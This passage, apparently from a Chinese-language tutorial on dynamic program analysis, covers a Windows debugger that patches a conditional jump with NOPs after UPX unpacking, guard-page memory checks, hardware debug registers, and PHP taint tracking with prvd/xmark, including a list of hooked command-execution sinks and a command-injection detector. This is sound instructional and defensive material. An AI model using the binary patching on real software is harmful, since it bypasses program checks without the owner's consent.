    printf(&quot;CreateProcessId=%X\n&quot;,process_info.dwProcessId);

    HANDLE process=open_process(process_info.dwProcessId);

    set_break(process,(void*)BREAK_ADDRESS_SHELL_JMP,1);  //  在UPX 解压结束的长跳转中设置中断

    DEBUG_EVENT debug_event={0};
    debug_event.dwProcessId=process_info.dwProcessId;

    while (WaitForDebugEvent(&amp;debug_event,INFINITE)) {  //  等待系统发来中断事件
        switch (debug_event.dwDebugEventCode) {
            case EXCEPTION_DEBUG_EVENT: {
                switch (debug_event.u.Exception.ExceptionRecord.ExceptionCode) {
                    case EXCEPTION_BREAKPOINT: {
                        CONTEXT regesit={0};
                        regesit.ContextFlags=CONTEXT_FULL;
                        GetThreadContext(process_info.hThread,&amp;regesit);  //  主要是读取EIP
                        printf(&quot;EIP=%X\n&quot;,regesit.Eip);

                        switch (--regesit.Eip) {
                            case BREAK_ADDRESS_SHELL_JMP: {
                                SetThreadContext(process_info.hThread,&amp;regesit);
                                char jmp_code[1]={0xE9};
                                remove_break(process,(void*)BREAK_ADDRESS_SHELL_JMP,jmp_code,sizeof(jmp_code));  //  消除断点替换0xE9 (JMP 的指令码)

                                char nop_code[2]={0x90,0x90};
                                remove_break(process,(void*)BREAK_ADDRESS_JE,nop_code,sizeof(nop_code));  //  往JE 写两个NOP
                            }
                        }
                    }
                }
            }
        }
        if (EXIT_PROCESS_DEBUG_EVENT==debug_event.dwDebugEventCode)  //  程序退出
            break;
        ContinueDebugEvent(process_info.dwProcessId,process_info.dwThreadId,DBG_CONTINUE);

    }
    printf(&quot;OK!\n&quot;);

    return 0;
}

</code></pre>
<p>调试程序运行到0x4307CC 执行<code>INT 3</code>指令中断,然后把原来的中断二进制数据0xCC (INT 3 指令的Opcode)换回0xE9 (JMP 指令的Opcode),然后让被调试的程序执行至结束.执行结果如下:</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic1.png" alt="" /></p>
<p>那么对内存区域进行读写权限限制具体是有哪些表现的.先用JAVA 举个例子(在https://tool.lu/coderunner/ 上执行):</p>
<pre><code class="language-java">
class Untitled {
	public static void main(String[] args) {
		String data = new String(&quot;Hello&quot;);

		data.charAt(0);
		data.charAt(6);

		System.out.println(data);
	}
}

</code></pre>
<p>程序输出如下:</p>
<pre><code class="language-txt">
Exception in thread &quot;main&quot; java.lang.StringIndexOutOfBoundsException: String index out of range: 6
	at java.base/java.lang.StringLatin1.charAt(StringLatin1.java:47)
	at java.base/java.lang.String.charAt(String.java:693)
	at Untitled.main(Untitled.java:6)

</code></pre>
<p>JAVA 在执行阶段,会根据对字符串的操作索引位置和字符串长度来检测是否存在上下标越界的问题,但是C/C++ 底层的汇编却不会对buffer 的操作索引进行检查.对于这个问题的解决方案,我们就使用<code>VirtualProtect()</code> 函数进行内存权限设置,一旦越界触发读写内存异常,下面是一段示例代码:</p>
<pre><code class="language-c">
#include &lt;malloc.h&gt;
#include &lt;memory.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;


#define TEST_FLAG &quot;AAAAAAAAAAAAAAAAAAAAAA&quot;


int main(int argc,char** argv) {
    char* buffer = (char*)malloc(0x10);

    printf(&quot;heap_address = 0x%X\n&quot;,buffer);

    memcpy(buffer,TEST_FLAG,strlen(TEST_FLAG));

    printf(&quot;Buffer Address = 0x%X\n&quot;,buffer);
    printf(&quot;Buffer = %s\n&quot;,buffer);

    return 0;
}

</code></pre>
<p>这段代码会触发越界写问题,但是程序没有因为越界写的问题导致程序崩溃.</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic20.png" alt="" /></p>
<p>然后我们构造两个buffer ,一个是外层是不允许访问的,然后在这个buffer 内部再分配一个可以读写的buffer .布局如下:</p>
<pre><code class="language-txt">
 outside-buffer               outside-buffer
 _______^___________________________^______
|  No-Access  |  Read-Write  |  No-Access  |
               -------v------
                inside-buffer

</code></pre>
<p>测试代码如下:</p>
<pre><code class="language-c++">

#include &lt;memory.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#include &lt;windows.h&gt;


#define TEST_FLAG &quot;AAAAAAAAAAAAAAAAAAAAAA&quot;


int main(int argc,char** argv) {
    LPVOID heap_region = VirtualAlloc(NULL,0x1000,MEM_COMMIT,PAGE_NOACCESS);

    printf(&quot;heap_region = 0x%X\n&quot;,heap_region);

    LPVOID address = (LPVOID)((DWORD)heap_region + 0x100);

    printf(&quot;heap_address = 0x%X\n&quot;,address);

    VirtualProtect((LPVOID)address,10,PAGE_READWRITE,0);

    char* buffer = (char*)address;

    memcpy(buffer,TEST_FLAG,strlen(TEST_FLAG));

    printf(&quot;Buffer Address = 0x%X\n&quot;,buffer);
    printf(&quot;Buffer = %s\n&quot;,buffer);

    return 0;
}

</code></pre>
<p>检测效果如下:</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic21.png" alt="" /></p>
<h3 id="硬件监控-1"><a class="header" href="#硬件监控-1">硬件监控</a></h3>
<p>前面提到,用INT 3 指令可以触发调试中断,但这是软中断.在硬件层上还有个更底层的调试中断寄存器:DR 寄存器.我们以OD 为例子来介绍,启动OD 并调试程序,点击菜单&quot;调试&quot;-&gt;&quot;硬件断点&quot;.</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic9.png" alt="" /></p>
<p>OD 会弹出硬件断点窗口.</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic10.png" alt="" /></p>
<p>我们回到OD 的汇编窗口,任意点击一条汇编指令,点击右键&quot;断点&quot;-&gt;&quot;硬件执行&quot;.</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic11.png" alt="" /></p>
<p>然后再回来到硬件断点窗口,就可以看到前面设置的记录了.</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic12.png" alt="" /></p>
<p>来到寄存器窗口右键点击空白区域,可以看到查看调试寄存器.</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic13.png" alt="" /></p>
<p>就能看到调试寄存器的内容输出.</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic14.png" alt="" /></p>
<p>DR 调试器包含DR0-DR3 ,DR6-DR7 .其中DR0-DR3 保存的是中断地址;DR6 是命中中断时记录地址是DR0-DR3 中的哪个编号;DR7 是调试控制位.在DR6 中保存的数据,如果命中了DR0 寄存器,那么DR6 寄存器的第15 位将会设置为1 .</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic15.png" alt="" /></p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic16.png" alt="" /></p>
<p>然后F9 执行,命中中断,DR6 寄存器数值产生了改变.</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic17.png" alt="" /></p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic18.png" alt="" /></p>
<p>DR7 寄存器各位的字段如下:</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic19.png" alt="" /></p>
<p>关于DR7 寄存器详细字段请自行查阅手册,使用DR 寄存器的方法和设置调试方法差别不大(一般应用DB 寄存器比较多的是在反反调试和反病毒中,此时一些常见软件调试手段会失效,比如代码自检函数头Hook 点,自动清除INT 3 指令,大量抛出异常干扰调试(这需要根据调试代码来识别,软件调试一般触发的事件有EXCEPTION_BREAKPOINT ,EXCEPTION_FLT_DIVIDE_BY_ZERO 等.但DB 寄存器会抛出STATUS_SINGLE_STEP ,这是硬件异常警告),这就需要依靠硬件寄存器来帮助调试),此处不再细说.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="动态代码分析基本原理-1"><a class="header" href="#动态代码分析基本原理-1">动态代码分析基本原理</a></h2>
<p>动态代码执行主要是使用调试模式或者模拟执行的模式跟踪执行程序.动态分析主要分为四部分:内存监控,污点追踪,符号执行,程序插桩.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="必备工具-10"><a class="header" href="#必备工具-10">必备工具</a></h2>
<p>Python ,Triton (https://github.com/JonathanSalwan/Triton)</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="污点追踪-1"><a class="header" href="#污点追踪-1">污点追踪</a></h2>
<p>污点追踪的主要原理是,在输入处构造一些带有标签的数据,然后在敏感函数和位置设置Hook ,观察带有标签的输入数据是否能够流到这个位置来判断漏洞是否存在.我们以prvd (https://github.com/fate0/prvd ,PHP 污点追踪工具)为例子介绍污点追踪.prvd 包含了生成污点数据,追踪数据流,复现漏洞.该项目的作者还写了一个PHP Hook 框架xmark (https://github.com/fate0/xmark ),这两者一起结合使用.整体结构如下:</p>
<p><img src="7.dynamic-analysis/%E5%8A%A8%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic7/pic22.png" alt="" /></p>
<p>先提示一下,xmark 框架分两点:1.重定向Opcode 的执行回调函数,达到Hook Opcode 的执行;2.重命名原函数名,然后再自定义同名函数达到Hook .先来看看prvd 的PHP.ini 文件,配置数据如下:</p>
<pre><code class="language-txt">
auto_prepend_file = &quot;/data/prvd/src/Entry.php&quot;   #  导入prvd 的Entry.php ,这是为了给输入打污染标签.

[xmark]  #  导入XMARK hook 框架
xmark.enable = 1
xmark.rename_enable = 0
xmark.rename_classes = &quot;  #  重命名类名称
    SQLite3:prvd_SQLite3,
    mysqli:prvd_mysqli,
    PDO:prvd_PDO,
&quot;
xmark.rename_functions = &quot;  #  重命名函数列表
    base64_decode:prvd_base64_decode,
    basename:prvd_basename,
    dirname:prvd_dirname,
    explode:prvd_explode,
    gzuncompress:prvd_gzuncompress,
    hex2bin:prvd_hex2bin,
    html_entity_decode:prvd_html_entity_decode,
    htmlspecialchars_decode:prvd_htmlspecialchars_decode,
    implode:prvd_implode,
    join:prvd_join,
    json_decode:prvd_json_decode,
    ltrim:prvd_ltrim,
    pathinfo:prvd_pathinfo,
    rawurldecode:prvd_rawurldecode,
    rawurlencode:prvd_rawurlencode,
    rtrim:prvd_rtrim,
    sprintf:prvd_sprintf,
    str_ireplace:prvd_str_ireplace,
    str_pad:prvd_str_pad,
    str_replace:prvd_str_replace,
    strstr:prvd_strstr,
    strtolower:prvd_strtolower,
    strtoupper:prvd_strtoupper,
    substr:prvd_substr,
    trim:prvd_trim,
    urldecode:prvd_urldecode,
    urlencode:prvd_urlencode,
    vsprintf:prvd_vsprintf,
    exec:prvd_exec,
    passthru:prvd_passthru,
    popen:prvd_popen,
    proc_open:prvd_proc_open,
    shell_exec:prvd_shell_exec,
    system:prvd_system,
    unserialize:prvd_unserialize,
    copy:prvd_copy,
    dir:prvd_dir,
    file:prvd_file,
    file_get_contents:prvd_file_get_contents,
    file_put_contents:prvd_file_put_contents,
    fopen:prvd_fopen,
    glob:prvd_glob,
    highlight_file:prvd_highlight_file,
    link:prvd_link,
    move_uploaded_file:prvd_move_uploaded_file,
    opendir:prvd_opendir,
    readfile:prvd_readfile,
    rename:prvd_rename,
    rmdir:prvd_rmdir,
    scandir:prvd_scandir,
    show_source:prvd_show_source,
    unlink:prvd_unlink,
    mysqli_init:prvd_mysqli_init,
    mysqli_multi_query:prvd_mysqli_multi_query,
    mysqli_query:prvd_mysqli_query,
    mysqli_prepare:prvd_mysqli_prepare,
    mysqli_real_query:prvd_mysqli_real_query,
    pg_prepare:prvd_pg_prepare,
    pg_query:prvd_pg_query,
    pg_query_params:prvd_pg_query_params,
    pg_send_prepare:prvd_pg_send_prepare,
    pg_send_query:prvd_pg_send_query,
    pg_send_query_params:prvd_pg_send_query_params,
    curl_exec:prvd_curl_exec,
    fsockopen:prvd_fsockopen,
    get_headers:prvd_get_headers,
    print_r:prvd_print_r,
    printf:prvd_printf,
    vprintf:prvd_vprintf
&quot;

</code></pre>
<p>xmark 的初始化函数主要是读取配置文件内的数据并初始化内部变量.</p>
<pre><code class="language-c">
PHP_INI_BEGIN()
  STD_PHP_INI_BOOLEAN(&quot;xmark.enable&quot;, &quot;0&quot;, PHP_INI_SYSTEM, OnUpdateBool, enable, zend_xmark_globals, xmark_globals)
  STD_PHP_INI_BOOLEAN(&quot;xmark.enable_rename&quot;, &quot;0&quot;, PHP_INI_SYSTEM, OnUpdateBool, enable_rename, zend_xmark_globals, xmark_globals)
  STD_PHP_INI_ENTRY(&quot;xmark.rename_functions&quot;, &quot;&quot;, PHP_INI_SYSTEM, OnUpdateString, rename_functions, zend_xmark_globals, xmark_globals)  //  从配置文件中的rename_functions 字段读取数据到rename_functions 变量
  STD_PHP_INI_ENTRY(&quot;xmark.rename_classes&quot;, &quot;&quot;, PHP_INI_SYSTEM, OnUpdateString, rename_classes, zend_xmark_globals, xmark_globals)
PHP_INI_END()

// 省略无关代码

PHP_MINIT_FUNCTION(xmark)
{
    // ...

    REGISTER_LONG_CONSTANT(&quot;XMARK_ECHO&quot;, ZEND_ECHO, CONST_CS|CONST_PERSISTENT);  //  设置常量值..
    REGISTER_LONG_CONSTANT(&quot;XMARK_EXIT&quot;, ZEND_EXIT, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_INIT_METHOD_CALL&quot;, ZEND_INIT_METHOD_CALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_INIT_USER_CALL&quot;, ZEND_INIT_USER_CALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_INIT_DYNAMIC_CALL&quot;, ZEND_INIT_DYNAMIC_CALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_INCLUDE_OR_EVAL&quot;, ZEND_INCLUDE_OR_EVAL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_CONCAT&quot;, ZEND_CONCAT, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_FAST_CONCAT&quot;, ZEND_FAST_CONCAT, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_ASSIGN_CONCAT&quot;, ZEND_ASSIGN_CONCAT, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_ROPE_END&quot;, ZEND_ROPE_END, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_DO_FCALL&quot;, ZEND_DO_FCALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_DO_ICALL&quot;, ZEND_DO_ICALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_DO_UCALL&quot;, ZEND_DO_UCALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_DO_FCALL_BY_NAME&quot;, ZEND_DO_FCALL_BY_NAME, CONST_CS|CONST_PERSISTENT);

    php_xmark_register_opcode_handlers();  //  设置Hook Opcode 回调函数
    rename_from_ini_value(CG(function_table), XMARK_G(rename_functions), XMARK_IS_FUNCTION);  //  function_table 和class_table 是PHP 内核的表,rename_from_ini_value 就是根据ini 文件的规则来重命名它们.
    rename_from_ini_value(CG(class_table), XMARK_G(rename_classes), XMARK_IS_CLASS);

    return SUCCESS;
}

static void php_xmark_register_opcode_handlers()
{
    zend_set_user_opcode_handler(ZEND_ECHO, php_xmark_op1_handler);  //  设置Opcode 回调函数..
    zend_set_user_opcode_handler(ZEND_EXIT, php_xmark_op1_handler);
    zend_set_user_opcode_handler(ZEND_INIT_METHOD_CALL, php_xmark_op2_handler);
    zend_set_user_opcode_handler(ZEND_INIT_USER_CALL, php_xmark_op2_handler);
    zend_set_user_opcode_handler(ZEND_INIT_DYNAMIC_CALL, php_xmark_op2_handler);
    zend_set_user_opcode_handler(ZEND_INCLUDE_OR_EVAL, php_xmark_op1_handler);
    zend_set_user_opcode_handler(ZEND_CONCAT, php_xmark_concat_handler);
    zend_set_user_opcode_handler(ZEND_FAST_CONCAT, php_xmark_concat_handler);
    zend_set_user_opcode_handler(ZEND_ASSIGN_CONCAT, php_xmark_assign_concat_handler);
    zend_set_user_opcode_handler(ZEND_ROPE_END, php_xmark_rope_end_handler);
    zend_set_user_opcode_handler(ZEND_DO_FCALL, php_xmark_fcall_handler);
    zend_set_user_opcode_handler(ZEND_DO_ICALL, php_xmark_fcall_handler);
    zend_set_user_opcode_handler(ZEND_DO_UCALL, php_xmark_fcall_handler);
    zend_set_user_opcode_handler(ZEND_DO_FCALL_BY_NAME, php_xmark_fcall_handler);

    if (XMARK_G(enable_rename))
        zend_set_user_opcode_handler(ZEND_INIT_FCALL, php_xmark_init_fcall);
}

//  这个函数由PHP 内核声明的.https://github.com/php/php-src/blob/852485d8ecd784153e41e565a0a87abf99cf4e0d/Zend/zend_execute.c#L4294

ZEND_API int zend_set_user_opcode_handler(zend_uchar opcode, user_opcode_handler_t handler)  //  设置Opcode 回调函数
{
  if (opcode != ZEND_USER_OPCODE) {
    if (handler == NULL) {
      /* restore the original handler */
      zend_user_opcodes[opcode] = opcode;
    } else {
      zend_user_opcodes[opcode] = ZEND_USER_OPCODE;
    }
    zend_user_opcode_handlers[opcode] = handler;
    return SUCCESS;
  }
  return FAILURE;
}

</code></pre>
<p>定位到<code>php_xmark_op1_handler()</code> 的代码,这个函数是处理对Opcode 的第一个操作参数进行处理的回调函数.实现细节如下:</p>
<pre><code class="language-c">
static int php_xmark_op1_handler(zend_execute_data *execute_data) {
    //  zend_execute_data 结构表示当前执行上下文环境,保存了代码执行位置和局部变量等数据.
    const zend_op *opline = execute_data-&gt;opline;  //  获取当前执行的Opcode
    zend_free_op free_op1;
    zval *op1;
    zval *z_fname;
    zval call_func_ret;

    if (XMARK_G(in_callback)) {  //  Opcode 调用过程中可能会触发多次回调函数被调用,这个标志就是识别是否多次重复被调用了.
        return ZEND_USER_OPCODE_DISPATCH;
    }

    z_fname = zend_hash_index_find(&amp;XMARK_G(callbacks), opline-&gt;opcode);  //  用户自定义Hook Opcode 回调
    if (!z_fname) {
        return ZEND_USER_OPCODE_DISPATCH;
    }

    XMARK_G(in_callback) = 1;  //  设置重复调用标记

    op1 = php_xmark_get_zval_ptr(execute_data, opline-&gt;op1_type, opline-&gt;op1, &amp;free_op1, BP_VAR_R, 0);  //  获取第一个Opcode 操作数

    if (op1) {
        if (SUCCESS != call_user_function(EG(function_table), NULL, z_fname, &amp;call_func_ret, 1, op1)) {
            zend_error(E_WARNING, &quot;call function error&quot;);
        }

        zval_ptr_dtor_nogc(&amp;call_func_ret);
    }

    XMARK_G(in_callback) = 0;
    return ZEND_USER_OPCODE_DISPATCH;
}

</code></pre>
<p>关于xmark 就介绍到此,然后我们再跟踪prvd 的Entry.php 文件,</p>
<pre><code class="language-php">
&lt;?php

if (!extension_loaded('xmark')) {
    trigger_error(&quot;xmark not installed&quot;, E_USER_WARNING);
    return;
}

// 省略代码

require(PRVD_ABSPATH.&quot;Config.php&quot;);  // 引入Config.php
require(PRVD_ABSPATH.&quot;Utils.php&quot;);   // 引入Utils.php

// mark 输入变量
prvd_xmark($_GET, true);  // 给输入点打标签
prvd_xmark($_POST, true);
prvd_xmark($_COOKIE, true);
prvd_xmark($_FILES, true);
prvd_xmark($_REQUEST, true);

foreach ($_SERVER as $key =&gt; &amp;$value) {
    if (stripos($key, 'HTTP_') === 0) {
        prvd_xmark($value);
    }
}

// 1. 加载 sink
prvd_load_file(PRVD_ABSPATH.&quot;sink/*/*.php&quot;);  // 这些目录下的都是规则命名文件.
// 2. 加载 filter
prvd_load_file(PRVD_ABSPATH.&quot;filter/*.php&quot;);
// 3. 加载 opcode
prvd_load_opcode(PRVD_ABSPATH.&quot;opcode/*.php&quot;);

</code></pre>
<p><code>prvd_xmark()</code> 函数则是调用xmark 拓展里面的函数给变量打标记.</p>
<pre><code class="language-php">
function prvd_xmark(&amp;$var, $recursive=true) {
    if (!PRVD_TAINT_ENABLE) return;
    if (is_string($var)) {
        xmark($var);
    } elseif (is_array($var) &amp;&amp; $recursive) {
        foreach ($var as $key =&gt; &amp;$value) {
            prvd_xmark($value, $recursive);
        }
    }
}

</code></pre>
<p>回到xmark.c 找到xmark() 函数声明,可以发现是通过给PHP 变量数据结构类型中的<code>type_info</code> 字段中做了标签记录(IS_XMARK_FLAG),这只适用于string 类型的PHP 变量.</p>
<pre><code class="language-c">
//  https://github.com/fate0/xmark/blob/34dd79d3e38dfb7f22c67eaedaa540a4cd88aee6/xmark.c#L1291

PHP_FUNCTION(xmark)  //  xmark.dll 导出函数
{
    zval *z_str;

    if (!XMARK_G(enable)) {
        RETURN_FALSE;
    }

    if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;z&quot;, &amp;z_str) == FAILURE) {
        return;
    }

    ZVAL_DEREF(z_str);
    if (IS_STRING != Z_TYPE_P(z_str) || Z_STRLEN_P(z_str) == 0) {  //  只给String 类型的变量打标记
        RETURN_FALSE;
    }

    if (xmark_zstr(z_str) == FAILURE) {
        RETURN_FALSE;
    }

    RETURN_TRUE;
}

//  https://github.com/fate0/xmark/blob/34dd79d3e38dfb7f22c67eaedaa540a4cd88aee6/xmark.c#L1124

static zend_always_inline int xmark_zstr(zval *z_str)  //  给变量打标记
{
    if (!XCHECK_FLAG(Z_STR_P(z_str))) {
        zend_string *str = zend_string_init(Z_STRVAL_P(z_str), Z_STRLEN_P(z_str), 0);  //  创建新字符串对象
        ZSTR_LEN(str) = Z_STRLEN_P(z_str);
        zend_string_release(Z_STR_P(z_str));
        XMARK_FLAG(str);
        ZVAL_STR(z_str, str);
    }

    return SUCCESS;
}

//  https://github.com/fate0/xmark/blob/34dd79d3e38dfb7f22c67eaedaa540a4cd88aee6/php_xmark.h#L41

#if PHP_VERSION_ID &lt; 70300
#   define IS_XMARK_FLAG            (1&lt;&lt;6)
#   define XMARK_FLAG(str)          (GC_FLAGS((str)) |= IS_XMARK_FLAG)
#   define XCLEAR_FLAG(str)         (GC_FLAGS((str)) &amp;= ~IS_XMARK_FLAG)
#   define XCHECK_FLAG(str)         (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)
#else
#   define EX_CONSTANT(op)          RT_CONSTANT(EX(opline), op)
#   define IS_XMARK_FLAG            (1&lt;&lt;5)
#   define XMARK_FLAG(str)          GC_ADD_FLAGS(str, IS_XMARK_FLAG)
#   define XCLEAR_FLAG(str)         GC_DEL_FLAGS(str, IS_XMARK_FLAG)
#   define XCHECK_FLAG(str)         (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)
#endif

//  https://github.com/php/php-src/blob/c4e4ef0498f691788e30e4cdfae3c3aa9dd3b1f1/Zend/zend_types.h#L516

static zend_always_inline uint32_t zval_gc_flags(uint32_t gc_type_info) {
  return (gc_type_info &gt;&gt; GC_FLAGS_SHIFT) &amp; (GC_FLAGS_MASK &gt;&gt; GC_FLAGS_SHIFT);
}

#define GC_TYPE_INFO(p)     (p)-&gt;gc.u.type_info
#define GC_FLAGS(p)         zval_gc_flags(GC_TYPE_INFO(p))

</code></pre>
<p>Entry.php 最后一部分就是引入检测规则,因为前面已经使用xmark 重命名了这些变量,那么接下来就需要以这些被重命名的函数进行重新声明,达到hook 的目的.</p>
<pre><code class="language-php">
// 1. 加载 sink
prvd_load_file(PRVD_ABSPATH.&quot;sink/*/*.php&quot;);  //  敏感函数
// 2. 加载 filter
prvd_load_file(PRVD_ABSPATH.&quot;filter/*.php&quot;);  //  过滤函数
// 3. 加载 opcode
prvd_load_opcode(PRVD_ABSPATH.&quot;opcode/*.php&quot;);  //  敏感Opcode

</code></pre>
<p><code>prvd_load_file()</code> 函数接下来不断把目录里面的规则文件require 进来.</p>
<pre><code class="language-php">
function prvd_load_file($pattern) {  //  加载策略文件函数
    $glob = prvd_get_function(&quot;glob&quot;);
    $ksort = prvd_get_function(&quot;ksort&quot;);
    $basename = prvd_get_function(&quot;basename&quot;);
    $file_list = $glob($pattern);
    $result_list = array();
    foreach ($file_list as $absfilename) {
        if (in_array($basename($absfilename), $result_list)) {
            prvd_log(&quot;error: function &quot;.$basename($absfilename).&quot; already exists in &quot;.$file_list[$basename($absfilename)]);
            continue;
        }
        $result_list[$basename($absfilename)] = $absfilename;
    }
    $ksort($result_list);
    foreach ($result_list as $filename =&gt; $absfilename) {
        $funcname = preg_replace(&quot;/\d{3}\-/&quot;, &quot;&quot;, $filename);
        $funcname = preg_replace(&quot;/.php$/&quot;, &quot;&quot;, $funcname);
        if (!function_exists(PRVD_RENAME_PREFIX.$funcname) &amp;&amp; !class_exists(PRVD_RENAME_PREFIX.$funcname)) {
            prvd_log(&quot;error: function/class &quot;.PRVD_RENAME_PREFIX.$funcname.&quot; not exists&quot;);
            continue;
        }
        if (function_exists($funcname) || class_exists($funcname)) {
            prvd_log(&quot;error: function/class &quot;.$funcname.&quot; already exists&quot;);
            continue;
        }
        require($absfilename);
    }
}

</code></pre>
<p>我们以<code>src/sink/rce/001-system.php</code> 举个例子,最后在重命名的<code>system()</code> 函数里面插入对函数参数的数据检测代码.</p>
<pre><code class="language-php">
&lt;?php
function system($command, &amp;$return_var = null) {
    prvd_check_rce($command, prvd_translate(&quot;Remote Command Execute&quot;));
    return call_user_func_array(PRVD_RENAME_PREFIX.&quot;system&quot;, array($command, &amp;$return_var));
}

</code></pre>
<p>漏洞检测方法如下:</p>
<pre><code class="language-php">
/**
 * 检测是否存在命令注入
 * @param $command
 * @param $message
 */
function prvd_check_rce(&amp;$command, $message) {
    global $prvd_sentry_client;
    if (!$prvd_sentry_client) return;
    if (prvd_detect_cmd_injection($command)) {
        $prvd_sentry_client-&gt;captureVuln($message);
    } else if (PRVD_TAINT_ENABLE &amp;&amp; prvd_xcheck($command)) {
        $prvd_sentry_client-&gt;captureVuln($message, &quot;debug&quot;);
    }
}

/**
 * 检测 CMD 语句是否异常
 * @param $cmd_string
 * @return bool
 */
function prvd_detect_cmd_injection($cmd_string) {
    // TODO: 目前只考虑了逃脱引号的情况，在双引号内的情况暂未支持
    $strlen = prvd_get_function('strlen');
    $stripos = prvd_get_function('stripos');
    $substr = prvd_get_function('substr');
    $in_array = prvd_get_function('in_array');
    $cur_pos = 0;
    $cmd_string_len = $strlen($cmd_string);
    while ($cur_pos &lt; $cmd_string_len) {
        while ($stripos(PRVD_WHITESPACE, $substr($cmd_string, $cur_pos, 1)) !== FALSE) $cur_pos++;
        if ($stripos('\'&quot;', $substr($cmd_string, $cur_pos, 1)) !== FALSE) {
            // handle literal
            $quote = $substr($cmd_string, $cur_pos, 1);
            $cur_pos ++;
            while ($cur_pos &lt; $cmd_string_len) {
                if ($quote === $substr($cmd_string, $cur_pos, 1))
                    break;
                elseif ($in_array($substr($cmd_string, $cur_pos, 2), array('\\\\', '\\\'', '\\&quot;')))
                    $cur_pos += 1;
                $cur_pos ++;
            }
            // broken cmd statement
            if ($cur_pos == $cmd_string_len) return TRUE;
            $cur_pos ++;
        } elseif ($stripos(PRVD_KEYWORD_ALLOW_CHARS, $substr($cmd_string, $cur_pos, 1)) === FALSE) {
            // handle op
            $cur_pos ++;
        } else {
            // handle keyword
            $keyword_start = $cur_pos;
            while ($cur_pos &lt; $cmd_string_len) {
                if ($stripos(PRVD_KEYWORD_ALLOW_CHARS, $substr($cmd_string, $cur_pos, 1)) === FALSE) break;
                $cur_pos ++;
            }
            if ($stripos($substr($cmd_string, $keyword_start, $cur_pos-$keyword_start),  PRVD_TANZI) !== FALSE)
                return TRUE;
        }
    }
    return FALSE;
}

</code></pre>
<p>关于Prvd 的污点追踪原理就介绍到此了,如有兴趣可以更深入去了解(Link : http://blog.fatezero.org/2018/11/11/prvd/ ).在部署好Prvd 之后,启用payload 模式,此时Prvd 会在$_GET $_POST 等中的数据插入一些攻击Payload ,然后由规则来匹配是否存在漏洞.对于这个步骤,测试者是不需要对HTTP 数据包(URL 中的输入位置,HTTP body ,HTTP Cookie )进行Payload 插入测试,测试者只需要根据页面进行常见的功能测试方法,然后Prvd 就会自行插入数据并且检测,这个也就是IAST (交互式安全测试)的原理.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="程序插桩与代码覆盖率-1"><a class="header" href="#程序插桩与代码覆盖率-1">程序插桩与代码覆盖率</a></h2>
